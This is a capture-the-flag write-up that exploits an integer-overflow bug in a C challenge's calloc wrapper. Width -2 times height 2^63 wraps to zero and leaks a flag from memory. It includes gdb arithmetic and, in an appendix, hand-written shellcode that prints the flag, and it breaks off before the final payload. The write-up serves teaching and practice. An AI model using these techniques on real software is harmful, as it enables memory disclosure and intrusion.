# Too Much

I actually over-complicated this a bit. I originally thought that I had to make use of the arbitrary memory write exploit to make this work. I did not.

The program uses a simple custom linear allocator for memory allocation (*god help you if you free stuff in the wrong order*). This isn't particularly relevant, other than it assures you that the flag, which is loaded in memory early in the program, is in the same buffer that gets printed out later on in the execution.

Problematic code:

```c
void* _calloc(struct s* m, unsigned long n, unsigned long size) {
    void* p = s_alloc(m, n * size);
    if (p) {
        memset(p, 0, n * size);
    }
    return p;
}

unsigned long width = strtoul(p, &p, 10);
unsigned long height = strtoul(p, &p, 10);
unsigned char* pixels = _calloc(m, width, height);
```

So, we have two unsigned long variables: `width` and `height`. We allocate a portion of the buffer based on `width * height`. We then fill the entire buffer we allocated with zeros before using it in the program.

**Why is this exploitable?**

The problem is that the result of the multiplication could overflow, resulting in the allocation of a small buffer, even when width and height are actually extremely large numbers.

*What numbers should we use?*

Well, I was looking at this bit of code later in the program:

```c
if (x < width && y < height) {
    pixels[y * width + x] = strtoul(p, &p, 16);;
}
```

And I said to myself: "Self, this is an arbitrary memory write. If I could specify that width was `-1`, then I could effectively address the entire memory space, and write arbitrary bytes into it."

Then I thought about it more, and I decided: I don't want to allocate *ANYTHING*, because if I do that the memory will be cleared by the call to `memset`. (I knew the flag was safely offset deeper into the buffer, so I could afford to allocate and clear a couple bytes, but why corrupt the state of memory at all if we didn't have to.)

Therefore: I wanted the result of `width * height` to be `0`, and I wanted width to be some small negative number. I chose `width` to be `-2` and `height` to be whatever value makes the multiplication `0`.

Why `-2`? Well, the binary representation of `-2` as a 64-bit unsigned integer is:

```
(gdb) p/x (unsigned long long)(-2)
$50 = 0xfffffffffffffffe
```

IE: it's 63 `1`s followed by a single `0`. That comes in handy, because multiplication by a power of two is equivalent to shifting the binary representation left. If we shift this number left 63 times, then we'd be left with `0`.

What number is that? Well, We all know that multiplying by 2^1 is the same as a single shift left. Likewise 2^2 is shift left by two. Therefore, 2^63 is 63 shifts left. Another way to write this is to specify the shifts as an operation: `(1ULL << 63)`

Let's see what the base 10 representation of these numbers are:

```
(gdb) p (unsigned long long)(-2)
$51 = 18446744073709551614
(gdb) p (1ULL << 63)
$52 = 9223372036854775808
```

Now, we verify the math works out like we expect:
```
(gdb) p/x 18446744073709551614ULL * 9223372036854775808ULL
$53 = 0x0
```

Now, we run the program locally (using a fake `flag.txt` file) and use these two values as an input and see what happens (*NO SPOILERS*):

Segmentation fault (core dumped)

```

**BOOM** we've dumped the whole buffer and then some (we actually kept dumping until the program seg faulted for reading invalid memory). We didn't even need to use the arbitrary mem write capability. When executed against the actual server, the dump will contain the hexadecimal representation of the flag string.

I actually forgot to copy this down and the server is currently unavailable.

## Appendix

For fun (and because I should really test things before going too far), I crafted some shellcode to print the flag that works if your `.text` section is writable (like, if you are running in a debugger).

The asm code looks like this:

```asm
###HAX
 a74:   48 8D 3D 15 16 20 00    lea rdi, QWORD PTR[rip+0x201615]
 a7b:   48 8B 35 9E 15 20 00    mov rsi, QWORD PTR[rip+0x20159e] //202020 = stdout
 a82:   E8 C9 FD FF FF          call 850 //<fputs>
 a87:   bf 00 00 00 00       	mov    edi,0x0
 a8c:   E8 1f fE FF FF          call 8b0 <exit>
 a91:   
 ```

 Which, when converted to the input form required by the program this is:

 ```
